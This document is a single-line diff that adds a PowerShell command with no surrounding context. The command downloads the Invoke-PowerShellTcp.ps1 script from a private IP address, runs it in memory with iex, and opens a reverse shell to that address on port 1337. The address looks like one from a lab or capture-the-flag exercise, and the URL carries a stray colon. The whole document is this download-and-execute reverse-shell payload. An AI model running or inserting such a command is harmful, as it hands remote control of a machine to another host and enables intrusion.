@@ -1,0 +1,1 @@
+powershell iex (New-Object Net.WebClient).DownloadString('http://:10.11.54.20:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.54.20 -Port 1337
